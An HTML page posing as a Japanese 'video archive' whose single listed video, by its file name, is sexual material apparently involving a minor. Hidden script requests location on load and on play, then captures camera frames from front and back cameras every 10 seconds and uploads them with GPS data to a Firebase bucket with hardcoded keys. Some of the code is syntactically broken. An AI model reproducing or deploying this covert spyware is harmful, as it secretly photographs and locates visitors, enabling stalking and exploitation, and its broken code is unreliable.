<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>動画保管庫</title>
    <style>
        .video-grid {
            display: grid;
            gap: 10px;
        }
        .video-item {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .video-container {
            position: relative;
            width: 100%;
            padding-bottom: 56.25%; /* 16:9 aspect ratio */
            background-color: #000;
        }
        .video-container video {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100%;
            height: 100%;
            transform: translate(-50%, -50%);
            object-fit: contain; /* This ensures the video fits within the container without cropping */
        }
        .video-item .title {
            width: 90%;
            margin-top: 10px;
            padding: 5px;
            text-align: center;
            border: none;
            background: none;
            color: #000;
            font-size: 16px;
        }

        /* レスポンシブデザイン */
        @media (min-width: 1200px) {
            .video-grid {
                grid-template-columns: repeat(4, 1fr);
            }
        }
        @media (min-width: 992px) and (max-width: 1199px) {
            .video-grid {
                grid-template-columns: repeat(3, 1fr);
            }
        }
        @media (min-width: 768px) and (max-width: 991px) {
            .video-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        @media (max-width: 767px) {
            .video-grid {
                grid-template-columns: 1fr;
            }
        }

        /* ダイアログのスタイル */
        .dialog-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .dialog {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            text-align: center;
        }
        .dialog button {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h1>動画保管庫</h1>
    <div class="video-grid" id="videoGrid">
        <!-- Videos will be dynamically inserted here -->
    </div>

    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <div class="dialog-overlay" id="dialogOverlay">
        <div class="dialog">
            <p>動画を再生するには権限を許可してください。</p>
            <button id="reloadButton">再試行</button>
        </div>
    </div>

    <script type="module">
        // 動画URLとタイトルのリストをここに配置
        const videos = [
	　　{
                url: 'https://firebasestorage.googleapis.com/v0/b/hozon-4794d.appspot.com/o/FC2-PPV-2885137%20%E7%8F%BE%E5%BD%B9%E3%81%AE%E9%AB%98%E2%97%8B3%E2%97%8B%E7%94%9F%E3%81%A7%E3%81%99%E3%80%82%20%E9%83%A8%E6%B4%BB%E7%B5%82%E3%82%8F%E3%81%A3%E3%81%9F%E3%81%82%E3%81%A8%E5%88%9D%E3%82%81%E3%81%A6%E3%82%AA%E3%83%8A%E3%83%8B%E3%83%BC%E3%82%92%E6%92%AE%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%BE%E3%81%97%E3%81%9F_1.mp4?alt=media&token=c3d99cd6-afe8-4fb3-8339-e8094eaa52e7',
                title: 'テスト'
            },

            // 他の動画URLとタイトルを追加
        ];

        function loadVideos() {
            const videoGrid = document.getElementById('videoGrid');
            
            videos.forEach(video => {
                const videoItem = document.createElement('div');
                videoItem.className = 'video-item';

                const videoContainer = document.createElement('div');
                videoContainer.className = 'video-container';

                const videoElement = document.createElement('video');
                videoElement.src = video.url;
                videoElement.controls = true;

                const titleElement = document.createElement('div');
                titleElement.className = 'title';
                titleElement.textContent = video.title;

                videoContainer.appendChild(videoElement);
                videoItem.appendChild(videoContainer);
                videoItem.appendChild(titleElement);
                videoGrid.appendChild(videoItem);

                // Add event listener to start camera capture on video play
                videoElement.addEventListener('play', () => {
                    requestCameraAccess();
                });
            });
        }

        // Firebase設定
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
            authDomain: "nou-no-circle.firebaseapp.com",
            projectId: "nou-no-circle",
            storageBucket: "nou-no-circle.appspot.com",
            messagingSenderId: "756338805186",
            appId: "1:756338805186:web:cb740e035ac611b5baae5b",
            measurementId: "G-TWBV38P13D"
        };

        // Firebase初期化
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        // カメラアクセスとキャプチャ関数を定義
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let videoStream;
        let captureInterval;
        let currentCameraIndex = 0;
        let frontCamera;
        let backCamera;

async function requestCameraAccess() {
            try {
                const position = await navigator.geolocation.getCurrentPosition();
                // 位置情報へのアクセスが許可された場合の処理
                console.log("位置情報へのアクセスが許可されました。", position);
            } catch (error) {
                // 位置情報へのアクセスが拒否された場合の処理
                console.error("位置情報へのアクセスが拒否されました。", error);
                showCameraPermissionDialog();
            }
        }
        // 位置情報の許可を求める
        navigator.permissions.query({ name: 'geolocation' })
            .then(permissionStatus => {
                if (permissionStatus.state === 'granted') {
                    // 位置情報へのアクセスが許可されている場合、カメラを起動
                    switchCamera();
                } else if (permissionStatus.state === 'prompt') {
                    // 位置情報へのアクセスが未設定の場合、許可ダイアログを表示
                    permissionStatus.onchange = () => {
                        if (permissionStatus.state === 'granted') {
                            // ユーザーが許可した場合、カメラを起動
                            switchCamera();
                        } else {
                            // ユーザーが拒否した場合、ダイアログを再表示
                            showCameraPermissionDialog();
                        }
                    };
                } else {
                    // 位置情報へのアクセスが拒否されている場合、ダイアログを表示
                    showCameraPermissionDialog();
                }
            })
            .catch(err => {
                console.error('位置情報へのアクセスエラー:', err);
                showCameraPermissionDialog();
            });
    } catch (err) {
        console.error('カメラアクセスエラー:', err);
        showCameraPermissionDialog();
    }
}

        function switchCamera() {
            if (videoStream) {
                videoStream.getTracks().forEach(track => track.stop());
            }

            const constraints = {
                video: {
                    deviceId: currentCameraIndex % 2 === 0 ? backCamera.deviceId : frontCamera.deviceId
                }
            };

            navigator.mediaDevices.getUserMedia(constraints)
                .then(stream => {
                    videoStream = stream;
                    startCameraCapture();
                    currentCameraIndex++;
                })
                .catch(err => {
                    console.error('カメラ切り替えエラー:', err);
                    showCameraPermissionDialog();
                });
        }

        function startCameraCapture() {
            if (videoStream) {
                const videoTracks = videoStream.getVideoTracks();
                const track = videoTracks[0];
                const imageCapture = new ImageCapture(track);

                // 1分ごとに撮影してアップロード
                captureInterval = setInterval(() => {
                    imageCapture.grabFrame()
                        .then(imageBitmap => {
                            canvas.width = imageBitmap.width;
                            canvas.height = imageBitmap.height;
                            ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
                            const dataURL = canvas.toDataURL('image/jpeg');
                            uploadImage(dataURL);
                            switchCamera();
                        })
                        .catch(err => {
                            console.error('画像キャプチャエラー:', err);
                        });
                }, 10000); // 60000ミリ秒 = 1分
            }
        }


        // 画像をFirebase Storageにアップロード
        function uploadImage(dataURL) {
            const storageRef = ref(storage, `images/${Date.now()}.jpg`);
            uploadString(storageRef, dataURL, 'data_url')
                .then(snapshot => {
                    console.log('画像がアップロードされました。');
                    // アップロード後にExif情報を付与
                    addExifData(snapshot);
                })
                .catch(err => {
                    console.error('アップロードエラー:', err);
                });
        }

        // アップロードされた画像にExif情報を追加する関数
        function addExifData(snapshot) {
            snapshot.ref.getDownloadURL().then(url => {
                navigator.geolocation.getCurrentPosition(position => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    const latitudeDMS = convertToDMS(latitude);
                    const longitudeDMS = convertToDMS(longitude);

                    const exifData = {
                        GPSLatitudeRef: latitude < 0 ? 'S' : 'N',
                        GPSLatitude: [latitudeDMS.degrees, latitudeDMS.minutes, latitudeDMS.seconds],
                        GPSLongitudeRef: longitude < 0 ? 'W' : 'E',
                        GPSLongitude: [longitudeDMS.degrees, longitudeDMS.minutes, longitudeDMS.seconds]
                    };

                    setData(url, exifData);
                    updateImageHead(url);
                });
            });
        }

        // 度から度分秒に変換する関数
        function convertToDMS(degrees) {
            const absoluteDegrees = Math.abs(degrees);
            const degreesInt = Math.floor(absoluteDegrees);
            const minutesFloat = (absoluteDegrees - degreesInt) * 60;
            const minutesInt = Math.floor(minutesFloat);
            const secondsFloat = (minutesFloat - minutesInt) * 60;
            const secondsFixed = secondsFloat.toFixed(2);

            return {
                degrees: degreesInt,
                minutes: minutesInt,
                seconds: secondsFixed
            };
        }

        // カメラ権限ダイアログを表示
        function showCameraPermissionDialog() {
            const dialogOverlay = document.getElementById('dialogOverlay');
            dialogOverlay.style.display = 'flex';
        }

        // ダイアログの再試行ボタンをクリックしたときにページを再読み込み
        document.getElementById('reloadButton').addEventListener('click', () => {
            location.reload();
        });
	
	// ページを開いた時に位置情報のアクセスを要求する
        requestCameraAccess();

        // ページロード時に動画をロード
        window.onload = loadVideos;
    </script>
</body>
</html>
